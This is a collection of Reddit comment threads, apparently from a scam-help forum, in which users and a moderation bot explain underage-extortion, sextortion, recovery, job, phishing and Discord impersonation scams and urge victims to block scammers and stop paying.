- We see this several times a week. This is just an !underage scam. You‚Äôve been sending money to a scammer in Nigeria and they are laughing at you.

You were texting with a dude on Badoo and the tit pic was from a Google Search. Let me guess, they really really wanted to see your dick. Had you shown them a picture of your dick, they‚Äôd have blackmailed you. Since you didn‚Äôt show the dude from Nigeria your penis, they pivoted to ‚Äúunderage‚Äù scam.

This is all a lie and you won‚Äôt get in trouble. Please just block them and stop sending money to a scammer dude in Nigeria.
- This can‚Äôt be a real post. A 22 year old sent me pictures of her boobs, so now I have to pay random people for ever?
- Seriously. Just block and ignore....
- There aren't enough words to express how confident we are that this is a scam. I'm glad you came around, you aren't getting your money back, but at least there's no more money going out. 

Assuming you do in fact stop.
- They are fake.
Advice is to block them and move on.
- [removed]
- You paid for six months?!?

You should have posted in this forum asking for help a long time ago. You would have been told within minutes that it's all a scam.

Stop paying if they ask for more! It's fake. There is no girl, no father, and no cop. You've done nothing illegal and can't get in any trouble.

Break off all contact and stop paying if they contact you again. Block them.

You're not going to get any of your money back, but at least you won't lose any more of your money.
- 100% chance it's fake. Something you should have thought the moment you heard from the "detective and the father" joined the party. This is an old and common scam. There's no girl, no dad and no detective.

Stop paying them now, block all their contact numbers and delete everything you've received from them.

And you're never getting the money back, so don't fall for recovery scams.
- Sounds like a classic scam. üò° 

The "detective," "father," and "girl" are probably all the same person or group trying to extort you. I‚Äôd block them everywhere and stop sending money. 

They‚Äôre just preying on your emotions.
- There‚Äôs no girl, no father and no police, just a scammer. Block, ignore, report and delete
- Poor guy :(
- That "girl" was most likely a shirtless teenage boy from Lagos
- Just some knowledge for you. There was no underage girl so no crime. You know what is a crime. Blackmail and extortion. I'm not saying to go to the law because more likely than not . They won't do a damn thing. but you can make bastards sweat a little bit. But smart thing to do is come they're not getting any more money block them and go about having a great life.. best of luck to you
- You can try filing a police report and give the PD the info on where you sent your money to. You won't get it back. But maybe someday law enforcement will find a way to track and jail these POS.
- I have a question did you ever met the girl? Did you saw any evidence she was a minor at all?
- new method just dropped
- Hi /u/TheCheeseDictator, AutoModerator has been summoned to explain the Underage scam.

This scam usually starts on a dating app and you will encounter a normal woman whose profile says she is above 18. Later you will be contacted and told that the girl is underage. They'll usually pose as the girl's father, another family member, or a police officer. They will tell you that your life will be ruined and you will be a sex offender, but will offer you the chance to pay them to make the problem go away. The stories they use as to why you need to fork over money vary, but the common ones include therapy for the girl, payment for a broken phone or computer, etc.

Of course, there is no girl and no crime has been committed, so if you are involved in this scam all you need to do is ignore their threats and move on with your life. The scammers may contact you again in the future after you block/ignore them, so be ready in case that happens. If you have already sent money to the scammers, you should try to dispute the transaction and see if you can get your money back. This is a [very common scam](https://www.reddit.com/r/Scams/search/?q=underage&include_over_18=on&restrict_sr=on&t=all&sort=new) and [here](https://www.wired.com/story/the-phone-call-from-hell/) are [some](https://www.wcnc.com/article/news/crime/teen-says-hes-the-victim-of-a-sextortion-scam/275-21216b29-df76-44f4-b20a-cb726e19d42e) relevant news [articles](https://www.jbsa.mil/News/News/Article/1503978/sextortion-scams-continue-to-occur-dont-give-into-scammers-demands/).

NOTE: Scammers pretend to be underage boys as well and the text above still applies, but it's called the underage girl scam as those are the vast majority of cases.

- Hi /u/realrechicken, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- As the bot says in other comments, there's a chance you can get your money back if you contact your bank, but they won't need any additional (personal) details to refund you. If it's genuinely your bank, they don't need information to cancel or refund a transaction they should have full visibility of.

Also only trust the bank if you have called them  or if it's directly through their approved app than them calling or emailing you.

- How does this help?? The damage is done.  I‚Äôm sure OP feels foolish as it is. Calling OP dumb doesn‚Äôt help. 

And to think on another post , someone said why are boomers always falling for scams?? Shows age doesn‚Äôt matter. These scammers find ppl that are vulnerable, age isn‚Äôt a variable. When you are vulnerable, mind doesn‚Äôt work right. 

Not exactly the same but when my mom passed, I was gone for a month bc she lived 1100 miles away. I knew my car payment was due. I couldn‚Äôt log in to pay online so  I just called. Easiest way for my not -fully functioning brain, I was a mess. I call and give my account #. Ma‚Äôam we don‚Äôt have an account under that number and the number isn‚Äôt what our usual account numbers look like. I‚Äôm panicky bc I don‚Äôt want payment to be late and incur late fee. So they looked up my account by name. Balance is zero. Can‚Äôt be right. Still have about 18 months left on loan . I am bawling. Then they ask ‚Äúare you sure it‚Äôs blah blah company?‚Äù

I had called my credit card provider, no balance as we pay it monthly , usually. 
I felt like such an idiot. I told them, through sobs and hiccups that I was sorry for wasting their time, my mom had just passed, not thinking correctly. 

I was vulnerable with myself bc too much going on. Scammers prey on this and older ppl that are lonely, any purported weakness or vulnerability and they pounce. They call and randomly hope they find someone  in this frame of mind.

But we aren‚Äôt dumb. Not at all.

Title: I applied to a job as an engineering but it seems fishy
Body: I've been looking for a job for a while (I have other offers and job experience as well). Recently a guy contacted me for a position in engineering in his company, all good there. However, this guy contacted me last year and told me to message him, and I did and he replied back to me just a few days ago. Not only that, I sent him my resume through linkedin and he asked me to email it instead (which is weird because I have other interviews and none of them have asked for that) and also the person wants all communication outside of linkedin and seems to be in a hurry. We only had one phone interview and he wants to hire me, but for a position like this you need at least 2 interviews.

It is important to mention this is a small company which acts as a contractor for another company, and I don't know if this a redflag or not but, when discussing benefits and such he messaged me on the same day that he talked to the insurance company. We all know that insurance companies take a long time to reply back.

Pretty much, I want a second opinion. Is this a scam?

- need more info. if you haven't met in person, its probably not real
- Website? Company name? Job description? Interview process? Pay? Domain they're contacting you from?

Do you have any substantive details? There's a ton of superfluous stuff in your post, but very little information.

For example, like half your post is focused on moving from LinkedIn to email. I don't know any recruiter that wants to conduct the hiring process on LinkedIn. That's not unusual.

But one phone interview? Super unusual. Doesn't happen for engineering jobs. Probably a scam.

Another example of red herrings/non-substantive stuff:

>We all know that insurance companies take a long time to reply back.

We don't know that. Some insurance companies are responsive.
- Is it a remote job, especially since you are not meeting in person at the business?

If it's a remote job, it is almost certainly a scam.
- It doesn't say it is, apparently I have to travel down to the site
- Well if it's close enough that you are commuting, you should be meeting in person there.

Title: Mail from supportteam@blockch-dep.info ?
Body: I got a phone call and email from Blockchain Support Team supportteam@blockch-dep.info regarding the reactivation of my account, which currently holds a balance of 3.2 BTC converted on. However, it has been temporarily suspended due to an unauthorized withdrawal attempt. 

Is this a scam? 

Has anyone experienced that?

Of course it's a scam, and not even a good one.
- The domain is barely a month old.  Highly suspicious.

!whois blockch-dep.info
- There is no such thing as "blockchain support team". There might be a support team for a given exchange, but this isn't it. A "blockchain support team" would have nothing whatsoever to do with an unauthorized withdrawal attempt. Again, that's something an exchange would do, not the blockchain.
- Is it your account and money?
- ` WHOIS REPORT FOR BLOCKCH-DEP.INFO `

**This domain name was created ONLY 44 DAYS AGO!!** and it was only registered for a single year (Expires: Dec 2025). 

It is also concerning that they are hiding their contact info on Whois. Additionally, the ` .info ` TLD is "low-quality" and more likely to be associated with malicious content. This website is hosted on a server located in Germany (*SEDO GmbH*).

Title: coworker claimed today that scam numbers cannot receive inbound calls, that can't be true right?
Body: I didn't confront her about this. We are a remote, small team that calls to schedule appointments. Some patients will think we are trying to scam them. This is not the case, and today my coworker had the "incredible idea" of calling them, providing them our phone number, and having them call in because "scam numbers cannot receive inbound calls".

I think she's thinking of spoofing numbers, where the call would go to the real owner of the number and not the spoofer. I didn't want to say anything to her at the time so I messaged our supervisor that I was pretty sure it wasn't true and could be dangerous advice. Most of our patients are older so it actually makes me pretty happy when someone says they need to talk to their doctor/otherwise confirm we aren't a scam before scheduling.

My coworker's idea might get someone to trust us, but aren't there also scams that rely on someone calling you, then giving you another number to contact?

- The correct response isn't to provide the number and ask them to call. The correct response is to tell them to look up the number and call. Scammers will frequently give their own number in place at the legitimate business, but they can't change the legitimate businesses listings
- You're correct.
- If somebody sends texts or voicemails spoofing your number, they will not receive the calls ‚Äì you will.

However, it remains that nobody should trust numbers left in a voicemail or text or communicated on an incoming call.

So that leaves you between a rock and a hard place.

I urge all outbound callers to not provide a callback number, because consumers are going to be more and more aware and suspicious.

A bank can say for example: call us at the number on the back of your credit card or call us at the number found on your monthly statement.

I don‚Äôt know what you do as a medical provider hopefully your patients have paperwork lying around or have you in their contact list.

One thing you can do is when you do see your patients in person please ask them to make sure they have your number in their contact list. 

Let them know that if they are ever suspicious about a call from you that you don‚Äôt mind if they just say, let me call you back. And explain that this is the safest way.

I realize this is a pain in the ass for you, and will increase your workload, but this is current reality.
- She is phrasing things wrong, but if I understand what it is she‚Äôs trying to say, her intent is correct. Scam calls CAN receive incoming calls, so simply telling someone ‚Äúscammers can‚Äôt receive incoming calls‚Äù is false. 

However, while scammers can spoof numbers that the victims may know to be legitimate they cannot receive incoming calls ON THAT NUMBER. So, what your co worker is saying about scammers not being able to accept incoming calls is missing is key additional piece of information. Her statement is only correct if the person calls back AND knows that they number they are calling is the actual number of the place they think they are speaking to.
- Thank you for your reply. The number isn't searchable - the guidance we got from our supervisor and manager is to notify them (they can notify the patient's provider) and make a note on the patient's upcoming appointment, if they have one, for the provider to address with the patient at their next appointment. The provider can give them our number as well. I think that's just fine so I have no idea why my coworker wants to do things this way. Who cares if a handful of patients don't get the appointment done because they don't trust us?
- Thank you!
- (Edit: I'm not a provider, I just schedule this specific type of appointment. So I never see the patient in person.)

Personally, I don't care if a patient thinks we're a scam - they can talk to their referring provider, who can provide our phone number to them directly. I have no idea why my coworker thinks this is a good idea. We can leave notes on visits they have to their usual provider so that that provider will give them the information they need, and I always tell them to talk to their doctor about it if they don't seem sure.

The number can't be looked up, it isn't for a whole practice. And I get why it seems shady to the patients! Especially when we were offering gift cards for completing the visit. It is a legitimate company and a valuable service we provide. I'm not judged in any way for the number of appointments I schedule so I never question people when they say they aren't interested for any reason. I had to stop a woman from spilling her guts to me about why she didn't want to schedule the other day.

Don't worry about my workload either lol, I'm calling less than 70 patients in an 8 hour workday and most of them don't pick up. I work for maybe 2 hours a day as is. Sometimes there's other things to do but not usually. One of the days in Dec I went literally all day without a single call.
- That's what I thought, she's conflating spoofing with every other type of phone scam there is. My concern is twofold - doing this would make us seem incompetent and unprofessional to our patients, and also, we work with several older folks (including her) and I don't want them to assume she's correct and get scammed. I left for the day right after I notified my supervisor that something was wrong there. Coworker doesn't do well with feedback from me so hopefully our supervisor will correct her.
- Your business doesn't have a public number that people can call to reach you? Not on your website or their membership cards?
- You know this made me think - there is a toll free number on the website, so maybe directing the patient to look us up and call that number, but the person who answers there likely wouldnt know much about the program in question and may not have the specific number the patient would need to contact the scheduling team for their practice. Theres a lot of separation, many many different providers and nurses and practices. Im also considering that anyone can put up a website and a lot of the patients are older and not tech savvy, and so may struggle with locating the correct website. 

I dont think there are any type of membership cards. The patients occasionally get letters related directly to us. Our company does many other things in healthcare and has a few divisions. 

I feel the current method (making a note on the patient's next upcoming appointment for the provider, and asking the patient to discuss with the doctor and call back) is fine, i get plenty of calls where the patient spoke with their doctor and are ready to schedule.
- I mean that sounds pretty scammy if a customer doesn't have the ability to call a company and be directed officially to the correct party. I get that you are some sort of contractor doing something like Housecalls for an insurance company but I mean I get those calls and I'm not responding because there is nothing preventing a scammer from pretending to be you and getting all my information or selling me something if I'm elderly. It's a shitty business model.
- Hey, it aint my business, i just work there. I dont want to share the name of the company but i think it would make more sense to you if i did. All the info you have currently is my admittedly limited understanding. For all i know, the operator at the main line could route you to me immediately. At my prior job i called hospitals and those operators were rarely capable of getting me to the right person, but i never thought the hospital was a scam lol

I do not work for an insurance company. Those house calls are basically scams and should not be done.

That said, this has deviated significantly from my original question.

FYI, scam screenshot looks like this.
- So I guess that scam has made its way over to twitter now
- Hi /u/YourUsernameForever, AutoModerator has been summoned to explain the Steam or Discord fake report scam.

This is a very common scam that happens either on Steam or Discord, or both.

You receive a message from someone claiming that they accidentally reported you, and they will direct you to the profile of a scammer that impersonates a Steam or Discord employee or admin. The other account will then either try to steal your Steam or Discord account. If you encounter this scam, ignore the scammers and report their accounts, including the one that says they accidentally reported you.

Remember: [the only way to contact Steam support is clicking here](https://help.steampowered.com/en/), and [the only way to contact Discord support is clicking here](https://support.discord.com/hc/en-us/requests/new).

[Here](https://i.imgur.com/DIgBZIN.png) is an example of the scam, [here](https://blog.malwarebytes.com/scams/2021/03/steam-users-dont-fall-for-the-i-accidentally-reported-you-scam/) is an article about the scam, and [here](https://help.steampowered.com/en/faqs/view/3195-9FFB-BA06-F25B) is Steam's scam page.

- Your friend fell for the scam, and had their account taken over. Its a scammer now.
- Discord scammers use other social media to try and contact potential victims now because the usual "I accidentally reported you" message is now ground for platform ban on Discord. It took literally over a year but finally something is moving.
- Took its time, considering the cesspool twitter is.
- well that sucks.
- Got the same kind of DM yesterday from a mutual. That i needed to go on discord and contact the head of security "aidreport\_anguskeene" It's sucks then since it looks like he fell for the scam...
- I got the exact same message today but the @ was "reportmod_anguskeene" my "mutual" has been blowing up my dms trying to get me to go to discord and filing an appeal on the account.

- Block them

Ignore them

That's it. That's all you need to do.
- the scammer will never, ever stop, as long as you keep giving them money. why would they? you are like a bank machine to them. even if they promised to stop if you sent them a million dollars, and then you sent them a million dollars, why would they stop? they will just ask for two million the next day.

you need to stop paying them, and block them whenever they contact you. maybe they will leak your photos, but probably not - as long as they haven't leaked them, they clearly have leverage over you. the only way to stop that is to block and ignore.

if they leak - lie, say they are AI generated with your face, whatever. the truth is, your family will be on your side and want to believe you. you can't control whether or not they leak them - either because you block them and ignore them or because they bleed you dry and you can't afford to keep paying them. that day will come with the path you are on.

block and ignore. the only thing you accomplish by giving them your money is giving them your money. it doesn't improve anything else for you.
- Ignore, block her and move on. All she wants from you is more money. And if she actually shares the photos, she looses that leverage.
- Stop sending her money - there is no "her" 

!sextortion
- Block. IF somehow (which is  VERY VERY UNLIKELY,) she actually does contact any of your friends or family, just shrug it off as some scammer using AI to manipulate images of you. Claim no knowledge of her.

NEVER ENGAGE WITH HER EVER AGAIN!!!
- Just block and ignore and report if you can. Go private on all social media. Do not respond to them. Do not respond to anyone you don't know messaging or calling you. Do not send any more money ever again. 

They will very likely keep trying to blackmail you. Paying a blackmailer does nothing, and they will keep trying to get more from you. 

Just don't ever talk to them again. One of two things will happen: they'll eventually move on, or they release the photos. Either way, at least you'll have your money. 

Very likely they will not send the photos to anyone. They will lose any leverage at that point. They will very likely just move on to another victim once they realize they can't get anything from you

If they really do end up sending stuff out to people you know, most people will never even see it. Would you click on a link or open a random picture from some random person on the Internet you don't know? Probably not. Even if people did open it, just tell them it's an online scammer using AI photos to try and blackmail you and to just block and ignore them

Just block them and keep blocking them and move on with your life. Go enjoy your day and forget about it. Likely nothing will ever happen
- Nice life lesson for you buddy. 
Keep on blocking.
- There is no girl. There's a romance scam / blackmail organization. It's a guy or several guys in a country you're unlikely to ever visit. Pictures this scam group may have sent you are lifted off the internet, or are from a model employed by the scam organization. But you're never really communicating with her. If you've done a video call, it's been with the model. But all the rest of the time you're talking to scammer guys.

They haven't told you one ounce of truth. Every penny you pay them just goes to their pockets, and there will always be a request for more money. In the end, they really don't care about you, and they don't even want to ruin your reputation. All they want is money. If you go dark on them, you're probably no longer worth their effort.
- If you send them more money they will continue demanding more. There is no amount you can send that will get them to leave you alone. There is also no way for you to get the pictures and videos away from them. The only way they ever stop demanding more is if you stop paying. Eventually they'll move on.
- > but she threatened me to tell my family about those pictures,

Your family knows what you look like naked, why would you care...?

Like this kind of scam happens constantly and I just don't understand why you think your nudes are so special your family is going to disown you for finding out you have male genitalia. They know. It isn't special. Block them and move on with your life, there's a reason you genuinely have never seen a story in your life of a scammer leaking nudes and ruining someone's life--cause it *never happens*.
- And if she share pics - probably a him ( btw were u an adult when it started ? ) - which 99 % won't happen,  just say it's IA.
- You have been scammed. Block, ignore, and forget the money you sent - *it is gone.*
- Don't worry so much about your family. They probably won't find out, because the scammer is not going to contact them - he (not she) is only interested in your money. 

But if your family did find out, they love you. People make mistakes and lots and lots of people have made this one. You didn't do anything terrible - just a little bit embarrassing.

Cut this off immediately and you will feel better.
- You need to block this person and move on. I agree with the other person who commented on here about telling whoever she sends these photos, if she sends them, to lie about their authenticity. It‚Äôs a traditional scam and you need to nip it in the bud before you lose everything.
- I'm sorry you're going through this. "She" will never stop. You're an ATM.

Ignore. The person won't send them on most likely. And if they do you can 1) claim it's AI 2) admit you fucked up and took some spicy shots and sent them to someone who's a piece of shit and is using you for money. I know I wouldn't judge if a friend said the second part. Shit happens. A lot of people take sexy photos in this day and age.
- You did not meet a girl.

You've been scammed by some dude sitting on a dirt floor in a third-world internet cafe.

The only question now is how long you will continue to play the fool before you come clean to your family and shake off the parasite.
- Tell your family first and soon before going dark/no-contact on the scammer... Scamming can happen to anybody.  The question boils down to how to best move forward so that the scammer doesn't win.  You can begin your conversation with your family as if you were struggling with a drinking or drug problem while being vague.  They'll imagine the worst including celebrity rehab and embarrassing viral videos.  When you finally reveal that your "problem" is a scammer, they'll be so relieved that it won't matter what the scammer does when you cut the scammer off.

Scammers use this concept of "Sunk Cost" against us.  The idea is that you've put all this time and money into something that it's just too difficult to mentally write it off.  But that's all a fallacy.  You already lost it whether you recognize it or not.  You've already made bad decisions.  Fessing up is the only true way forward.  You don't even need to sign up for an AA program to learn this lesson.

Scammers are also business people, keenly aware that they need to maximize the money they get from their mark.  If their mark (that would be you in this case) becomes more trouble than they're worth, the scammer will find another mark.  Apparently, and sadly, new marks are very easy to find.  As they say, "there's a sucker born every moment."  So stop responding.  You'll get threats.  Don't respond to those either.  Some threats may turn into something more.  It can help to change your phone number (although you may end up getting another scammer's mark's phone like I did.  I foolishly answered a number I didn't recognize... Don't do this!!! ... Scammer: "I'm going to release those photos to the interwebs if you don't pay $248 by tonight."  Me: "Please release them.  It will unburden me so.  I haven't gone to confessional for months and this is my just penance." Scammer: "There will be consequences if you don't pay the $248." Me: "There are consequences to living life on this small planet.  Bring it on!" ... Scammer: click.)  It's best not to answer any phone numbers you don't recognize as friends or family.  Ignore them and they'll leave.  

In the world of AI deep fakes, no one will believe that whatever photos are released are you anyways. And truly, no one cares.  

We should all be able to eat embarrassment for breakfast so that we can approach the day with humility.
- Block and move on. Don‚Äôt send any more money. Don‚Äôt end it all. The person who you are talking to isn‚Äôt even really a girl. All they want is money, they don‚Äôt care about you or your photos.
- There are whole towns in Nigeria with boys driving BMWs and Mercedes, pretending to be pretty ladies online. They won't tell your family, they probably have 50 other marks in their portfolio, They don't profit a dime from telling your family so it's not worth the effort.
- When you are ready to stop sending money stop.
- Send anyone any money at any time for anything produces results. They will ask for me. They will at first ask for more, then demand more then the phone calls start especially at dinner time. Don't send anything to begin with. Block and move on
- this is a !Sextortion scam all you really can do it stop sending money and block them
- Take a deep breath first. It happens. You aren't a bad person for being scammed. You have the power to stop it now.   
  
First, block, block, block. The scammer (this is not the woman you thought you were talking to, so please get that image out of your mind) will keep trying to reach you and increase their threats. DO NOT FALL FOR IT. Don't respond, don't react, just block. Make your social media accounts private and block anyone you don't know personally. 

The most common result is that they will eventually move on when the effort isn't worth the returns. If they threaten to share your photos, so what? It's a human body and you had a moment of horny weakness. The embarrassment will pass.

Also, watch out for !recovery scammers. They lurk in this sub looking for new victims. Even your scammer will reach out to you under a different identity with the promise of getting your money back. It is all lies. Don't let yourself be a victim again.
- Did you mean to post this from two different accounts?
- Who cares if your family does find out or see some pictures? What‚Äôs the worst that could possibly happen? Hundreds of millions of people have naked pictures of themselves out there whether it be in print, on film, or digital that‚Äôs been seen by millions. Their life goes on.
While I could do 1 million examples, there are naked pictures of Madonna out there, in film and print. So what? Did it hurt her? There‚Äôs a topless picture of Kate Middleton out there‚Ä¶ Again‚Ä¶ So what.
I‚Äôm not trying to diminish Your quandary, but really, what‚Äôs the worst that can possibly happen?
- They are manipulating you with shame. Easy, effective, classic. But you can overcome shame with sense. Really what your mind is telling you is just panic and fear, it will not be that bad if they would leak some pictures (and they won't, honestly they don't care about you or your situation enough to bother).   
What would you do if one day you got an email from a random dude saying "hey man guess what this is a picture of your brother jerking off!!!". Like... okay weirdo. So what. Are you honestly gonna disown your brother now? Nah.

It's good to sometimes piss your pants in public, fall in a puddle, call your teacher 'mum', have toilet paper coming out of your skirt etc. A good dose of utter shame every now and then keeps us grounded. We see that, oh, indeed life goes on, no one cares. People who love us love us still. We can have a laugh.  
  
You don't need to be afraid of your family finding out you did something dumb. They probably think that you are a lovable dummy already!! It's not like you did something horrible, like steal from an old sick woman, or kill a puppy. Like you're just a goofy fun guy who liked a girl and did a silly thing and got played. It happens to everyone one way or another. It's not that bad.
- Coincidentally I've just watched Pleasant Green's video about this very scam [https://www.youtube.com/watch?v=iL59zK66pBo](https://www.youtube.com/watch?v=iL59zK66pBo)
- Just ignore who cares about photos anymore, of is a thing so ü§∑üèø
- You met a guy
- I know someone who went thru the same thing. It continued until ALL her money was gone. Then they sent the pictures to her relatives anyways bc they hate Americans. Save your money. Tell your family you were black mailed and if anyone sends them pics don't even open it. Just trash it. Might have a virus in it too
- No judgement here. You are not alone. ¬†Just remember for the future. ¬†There is no such thing as ‚Äúmeeting‚Äù people online. ¬†That is one of the biggest lies of the internet age. ¬†Even before AI took all this to another level. ¬†If you don‚Äôt have an opportunity to sit in the same room and at a minimum shake their hand, they don‚Äôt exist.
- There was a fairly recent story of a teenage boy who also met a girl online, sent pictures, and was threatened that they would be released to his family if he didn't pay up.   The whole interaction only lasted a few hours but long story short, he did kill himself. I'm 100% positive that his family would've rather seen a few photos and videos instead of burying their child. Plot twist - the "girl" was a couple of Nigerian teenagers.  Don't pay, don't beat yourself up about it and just don't do it again.  The AI story will work.

- It seems like just about everyone has told you to cease all contact but you are resisting because of some pictures? It‚Äôs never going to change so long as you do nothing. This may seem harsh, but it‚Äôs called tough love- yes, you made mistakes. Take ownership for it and learn from it. That‚Äôs all that you can do. And above all else, STOP sending this person money. It‚Äôs not even a female with whom you‚Äôve been talking.
- Sharing the photos is illegal but they won‚Äôt
- A few years ago? She strung you along for a long time...oh, wait, I know why!

You kept sending her money!

Delete all evidence of her from all devices. Block her phones, emails, and other accounts.

She's not going to share anything with your family; I find it unlikely that she'll be capable of tracking them down because you have an uncommon name.

Trust me, she will write you off as an ATM the moment she realized you've blocked her. Then she can concentrate on her other victims, of which she likely has more than a few.
- Tell them it's illegal to share intimate photos of others and you will report them to the police. 

Then block them.
- Oh my goodness,  I'm so sorry that you're going through this! I can imagine how terrifying and depressing it must be. But stop beating yourself up right now because EVERYONE on this Earth has made mistakes that we regret and caused us potential embarrassment. That being said, I can guarantee you a couple of things... and here they are in no certain order: #1- anyone who judges you for this is an idiot on a high horse with a bully mentality... meaning they have low self-esteem & have probably done something way worse than this & the only way for them to feel better about themselves is to put someone else down. In other words, they're just projecting & aren't worth your time & energy. #2 - the person extorting you is likely a MALE... maybe even more than one, and is likely a "professional" scammer... i.e. this isn't his/their first rodeo. These people are very sick & evil, and they know what they're doing. If this wasn't such a well-oiled scam it wouldn't work so well... so you're not the only one this has happened to, so take heart & again, don't be hard on yourself. #3 - this one actually should be #1 because this IS important... the MOST important out of all the things I'm guaranteeing you: I seriously doubt this person(s) is going to contact your family and send them the pics. It's likely just something they're saying to scare you into submission. Because if you refuse to give them any more money it would serve them no purpose to go through with it... because they know that the only currency they have to deal with you is through threats... and as soon as they release any photos to someone you know they'll burn up every bit of that currency they had to deal with you. And EVEN IF the worst happens & they DO send those pictures to your friends & family, no matter how bad this seems, they probably won't react as bad as you're worried they would. And I believe in all the other comments on here that I've read someone suggested you can just claim that the pictures were done by AI... which is an excellent idea, since AI has gotten good enough to actually be able to fake pictures like that! So I wholeheartedly second that suggestion! So now that you have an explanation you can offer if someone DOES receive some compromising pictures of you, it's time to cut off ANY & ALL contacts with these evil sacks of elephant dung, stop beating yourself up & just chalk this up to a learning experience, & move on with your life! Godspeed... you're going to be just fine... you got this!
- [removed]
- Show your family the photos lmao
- [removed]
- This is the correct answer
- Very good advice, and Cas is bang on about the AI part ,now a days you can‚Äôt believe what you see on the internet, stop paying, put your head up high, walk, tall and get on with life with a smile, when you stop answering chances are they ain‚Äôt gonna do shit, they probably have a couple other people they are doing it too, so they won‚Äôt bother and will  go onto the next unfortunate person they have,

- Hi /u/Dry_Winter7073, AutoModerator has been summoned to explain the Sextortion scam.

This scam occurs when you meet a woman/man on dating service/social media site/forum/wherever and they ask you to go on Skype, WhatsApp, Telegram, or another messaging system. They will ask you to exchange naked pictures, and they will usually ask you to include your face in the pictures. They will then threaten to reveal the pictures to your family/friends if you do not pay them. The best thing to do in this situation is block the scammer and go private in your socials for a while. Paying the scammer will not make them back off, and just tells them that it is worth their time to continue threatening you.

If you fell for this scam, we recommend you join the sextortion subreddit and follow the recommendations of their sticky post: https://www.reddit.com/r/Sextortion/comments/n4yorq/new_victims_please_read_first/

Also beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the photos or get back at the extorter. They can't, it's a trick to make you lose more money.

- I first posted this indeed on my other account but i thought it was removed, so I posted it here
- >Tell your family you were black mailed and if anyone sends them pics don't even open it. Just trash it. Might have a virus in it too

This is also a good idea.
- >And yes u r stupid to fall for this obvious scam

The rest of your advice is on point up until that stupid remark. It was absolutely unnecessary! OP is already beating himself up... how was that helpful?? People have committed SUICIDE over feeling shame for falling for scams like this... and obviously you don't care if you help push them over the edge with a dumb comment like that! It's just like I told OP about anyone trying to shame him. He's not stupid... he MADE A DAMN MISTAKE IN A MOMENT OF WEAKNESS. People who make comments like you did are condescending & holier-than-thou, & are the ones who should be ashamed. Let those without sin cast the first stone!

- Why does it matter??
- Roght. And the pics he received are likely from the Internet. I've investigated scammers for friends and often find multiple, similar accounts in different sites with the same photos, but different stories. Too bad he got reeled in.
- Just delete all your social media. You will feel better anyways regardless of the dick pic situation.¬†


She isn't a woman. It is a dude or group of people scamming you.


Nobody cares about your junk photos anyways. Everything is ai so who cares. Anybody could make any photo of anyone.
- Con men are WAY better at tricking regular folks than regular folks are at figuring out the scam.  

That‚Äôs their special skill, something they‚Äôve practiced and practiced over and over and over again.  

For you, it was a personal relationship.  For them, it was just their job.  Nothing to feel bad about: you were outmatched from the start.

This once.

Now, you‚Äôre a smarter and better person.  But he/she is still just a dirtbag.
- Don't feel dumb! It can happen to the best of us. Trust me when I say that. I was being pig butchered and knew it but I always try and see the good in people so they were excellent w/their wording, even had photos to back it up. It wasn't until I insisted on FaceTiming is when they became angered which pretty much confirmed my suspicions! But because he paid for my upgrade telegram account, I thought most scammers won't invest a dime but instead take it from you, so I opened up. Well when I looked at his video he sent proving he was real? It was an obvious ai generated, you could see the imperfections. So I ended it and he got nothing from me! Long and beyond, 6 weeks later of no communication, he recently msg'd thru his cell phone that he was indeed flying back into LAX on the 27th and wanting to prove he's real, of course he's not! Just his way of seeing what he can get out of me. Never ever send money to anyone you haven't personally met. These people are really good at what they do. If they threaten to expose you? Claim it's ai generated and not you! They likely won't anyways. Shut down your friends list on any social media accounts and never send any photos to anyone you also haven't met. Just block them. Let them try, they likely won't! You got this!!!
- Then she ( h√©) distributed porn to an underaged. You are totally a victim, don't feel ashamed. It's them who are predators.
- Good bot!
- I did that myself once, tried making a throwaway, got a message my post had been removed but it hadn't üò¨

Anyway OP, you say you've been thinking of ending things.I sincerely hope you did not mean you've been thinking of hurting yourself. You should end all interactions with this scammer, right now, and block them wherever their ugly scamming head pops up. This whole thing is a life lesson. Life lessons are part of growing up.
- That's a high level tip that should be in the FAQ if it isn't reverse-engineer the images, preferably before you share your own images, or afterward to indicate it's a scammer who will likely move on.

I had a different situation, where an anonymous person photo-shopped my arm onto a photo of another woman who was on her knees with naked backside facing the camera. My arm has some distinct markings so at first I was like, who took this photo? Whose apartment is this? I'm studying the furniture and the carpet. And then I was like, wait, that's not my ass LOL!

It was still extremely stressful. I figured out who did it and I got a lawyer involved to give him a scare. Not another peep out of him for 8 years and counting.
- I think you read this wrong. 

Q: were you an adult when this started?
A: yes
- That's quite a story and shows how susceptible we all are to scams of some sort. Your story is scary.

I got two phone calls today on two different phones from the same recruiter (offshore) who spoofed different names on the same incoming number. He didn't get me on phone #1 and left no message (irritating!) so he tried #2.  I blocked him on #1 but answered #2 and read him the Riot Act as I recognized the number. Yeah, great way to do business, a-hole. Blocked now on both phones.

So was he legit? Who cares. He was rude. Scammers are everywhere.
- That's a horror story. You should have hired an Italian lawyer from New York. LOL!


So was this supposed to be a prank that went wrong? Doesnt sound like you found it remotely humorous.
- True tks !
- IKR? If I couldn't even tell that it was photoshopped other than knowing what my own backside looked like, Jesus Christ.
- Oh no not at all. He was pissed off about the break-up and wanted to scare me. He also took possession of my cell phone number because it was on his phone plan. Then I had a male friend call and impersonate him to switch the phone number to my own account, but I didn't think to switch carriers away from Sprint. So he called and switched it back. Asshole. At that point I got a new number.

